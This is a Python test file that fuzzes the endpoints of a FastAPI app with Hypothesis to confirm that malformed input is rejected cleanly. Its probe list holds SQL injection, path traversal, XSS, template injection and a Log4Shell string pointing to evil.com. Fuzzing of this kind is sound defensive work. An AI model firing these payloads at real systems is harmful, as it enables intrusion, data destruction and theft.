"""API Schema & Input Fuzzing Harness.

Uses Hypothesis property-based testing to fuzz API endpoints with extreme boundaries,
arbitrary Unicode, invalid types, oversized strings, and SQL injection probes.
Verifies that the API never returns unhandled 500 errors and strictly enforces validation.
"""

from __future__ import annotations

from decimal import Decimal

from fastapi.testclient import TestClient
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from app.domain.simulation import Change, Scenario, SimulationRequest, simulate
from app.main import app

# ─── Strategies ─────────────────────────────────────────────────────────────

# Arbitrary values for raw payload fuzzing (adversarial types)
fuzz_json_primitives = st.one_of(
    st.text(),
    st.integers(),
    st.floats(allow_nan=False, allow_infinity=False),
    st.booleans(),
    st.none(),
)

fuzz_json_objects = st.recursive(
    fuzz_json_primitives,
    lambda children: st.lists(children, max_size=5)
    | st.dictionaries(st.text(max_size=20), children, max_size=5),
    max_leaves=15,
)

sql_injection_probes = st.sampled_from(
    [
        "' OR '1'='1",
        "'; DROP TABLE reminders; --",
        "' UNION SELECT * FROM users --",
        "1; WAITFOR DELAY '0:0:5'--",
        "../../../../etc/passwd",
        "<script>alert(1)</script>",
        "\x00\x01\x02\xff",
        "{{7*7}}",
        "${jndi:ldap://evil.com/x}",
    ]
)


client = TestClient(app)
client.__enter__()


# ─── 1. Simulation Domain Property Fuzzing ──────────────────────────────────


@given(
    starting_savings=st.decimals(
        min_value=Decimal("0"), max_value=Decimal("1000000"), places=2
    ),
    monthly_income=st.decimals(
        min_value=Decimal("0"), max_value=Decimal("50000"), places=2
    ),
    monthly_expenses=st.decimals(
        min_value=Decimal("0"), max_value=Decimal("50000"), places=2
    ),
    months=st.integers(min_value=1, max_value=60),
)
@settings(max_examples=30, deadline=None)
def test_simulation_domain_property_invariants(
    starting_savings: Decimal,
    monthly_income: Decimal,
    monthly_expenses: Decimal,
    months: int,
):
    """Property test: Simulation calculations must preserve strict mathematical invariants."""
    scenario = Scenario(
        name="Baseline",
        changes=[
            Change(name="Bonus", amount=Decimal("100"), frequency="monthly", month=1)
        ],
    )
    req = SimulationRequest(
        starting_savings=starting_savings,
        monthly_income=monthly_income,
        monthly_expenses=monthly_expenses,
        months=months,
        scenarios=[scenario],
    )
    result = simulate(req)

    assert len(result.scenarios) == 1
    balances = result.scenarios[0].balances
    # Balances array must have exactly months + 1 points (initial + each month)
    assert len(balances) == months + 1
    assert balances[0] == starting_savings


# ─── 2. Raw JSON Schema Fuzzing Against /api/v1/simulations ──────────────────


@given(payload=st.dictionaries(st.text(max_size=30), fuzz_json_objects, max_size=10))
@settings(max_examples=35, deadline=None, suppress_health_check=[HealthCheck.too_slow])
def test_simulations_endpoint_arbitrary_payload_fuzzing(payload: dict):
    """Fuzzing harness: /api/v1/simulations must gracefully validate or reject, never crash 500."""
    response = client.post("/api/v1/simulations", json=payload)
    # Must either be 200 OK (if accidentally valid) or 422 Unprocessable Entity
    assert response.status_code in {200, 422}, (
        f"Unexpected status code {response.status_code}: {response.text}"
    )


# ─── 3. Chat Endpoint Adversarial & Unicode Fuzzing ──────────────────────────


@given(
    message=st.one_of(
        st.text(max_size=500),
        sql_injection_probes,
        st.text(
            alphabet=st.characters(
                blacklist_categories=("Cs",)
            ),  # avoid lone surrogates in json
            min_size=0,
            max_size=200,
        ),
    ),
    remember=st.booleans(),
    browse=st.booleans(),
)
@settings(max_examples=30, deadline=None, suppress_health_check=[HealthCheck.too_slow])
def test_chat_endpoint_adversarial_fuzzing(message: str, remember: bool, browse: bool):
    """Fuzzing harness: /api/v1/chat input must never raise 500 on weird text or injection."""
    response = client.post(
        "/api/v1/chat",
        json={"message": message, "remember": remember, "browse": browse},
    )
    # Valid chat triggers mock LLM (200), blank/malformed triggers 422,
    # browse disabled triggers 503
    assert response.status_code in {200, 422, 503}, (
        f"Unexpected status code {response.status_code}: {response.text}"
    )


# ─── 4. Feedback Endpoint Boundary Fuzzing ───────────────────────────────────


@given(
    rating=st.integers(min_value=-1000, max_value=1000),
    comment=st.one_of(st.none(), st.text(max_size=3000), sql_injection_probes),
)
@settings(max_examples=35, deadline=None, suppress_health_check=[HealthCheck.too_slow])
def test_feedback_endpoint_boundary_fuzzing(rating: int, comment: str | None):
    """Fuzzing harness: /api/v1/feedback accepts only ratings 1..5, rejecting others with 422."""
    response = client.post(
        "/api/v1/feedback",
        json={"rating": rating, "comment": comment},
    )
    if 1 <= rating <= 5 and (comment is None or len(comment) <= 2000):
        assert response.status_code == 201
        assert response.json() == {"status": "recorded"}
    else:
        assert response.status_code == 422


# ─── 5. Task & Reminder Schema Robustness Fuzzing ────────────────────────────


@given(
    title=st.one_of(st.text(max_size=500), sql_injection_probes),
    priority=st.text(max_size=50),
    due_at=st.one_of(
        st.none(),
        st.text(max_size=100),
        st.datetimes().map(lambda d: d.isoformat()),
    ),
)
@settings(max_examples=30, deadline=None, suppress_health_check=[HealthCheck.too_slow])
def test_tasks_endpoint_schema_fuzzing(title: str, priority: str, due_at: str | None):
    """Fuzzing harness: /api/v1/tasks robustly parses or rejects varying payloads."""
    response = client.post(
        "/api/v1/tasks",
        json={"title": title, "priority": priority, "due_at": due_at},
    )
    # 201 for accepted, 422 for schema/date format violation, never 500
    assert response.status_code in {201, 422}, (
        f"Unexpected status {response.status_code}: {response.text}"
    )
